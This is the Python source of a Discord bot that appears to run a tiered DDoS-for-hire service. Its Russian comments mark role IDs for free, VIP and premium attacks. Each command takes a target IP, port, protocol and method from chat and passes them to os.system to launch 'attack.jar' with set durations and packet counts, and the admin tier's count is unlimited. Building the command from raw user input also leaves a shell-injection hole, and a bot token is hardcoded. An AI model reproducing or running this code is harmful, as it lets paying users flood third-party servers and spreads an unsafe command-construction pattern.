import discord 
import time
import os
from discord.ext import commands

intents = discord.Intents.default() 
intents.message_content = True

token = "M-T-A-1OTUwMTM1OTM1Njk4OTQ5MA.GiO1Z9.pbF4DzgwQPUrxACYv8ksoD805jqgBufdel8e00"
prefix = ">"
fre = 1059502827447267338 # айди роли для фри атак
vip = 1059503060235329617 # айди роли для вип атак
prem = 1059503066354827355 # айди роли для прем атак
adm = 1090699985919684708

bot = commands.Bot(command_prefix=prefix, intents=intents) 
bot.remove_command('help')

@bot.command()
@commands.has_role(fre)
async def free(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        return
    else:
        if port == None:
            return
        else:
            if protoc == None:
                return
            else:
                if method == None: 
                 return
                else:
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 35" + " 50000")
@bot.command()
@commands.has_role(prem)
async def premium(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        return
    else:
        if port == None:
            return
        else:
            if protoc == None:
                return
            else:
                if method == None: 
                 return
                else:
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 60" + " 120000")
@bot.command()
@commands.has_role(vip)
async def vip(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        return
    else:
        if port == None:
            return
        else:
            if protoc == None:
                return
            else:
                if method == None: 
                 return
                else:
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 45" + " 75000")
@bot.command()
@commands.has_role(adm)
async def admin(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        return
    else:
        if port == None:
            return
        else:
            if protoc == None:
                return
            else:
                if method == None: 
                 return
                else:
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 60" + " -1")

bot.run(token)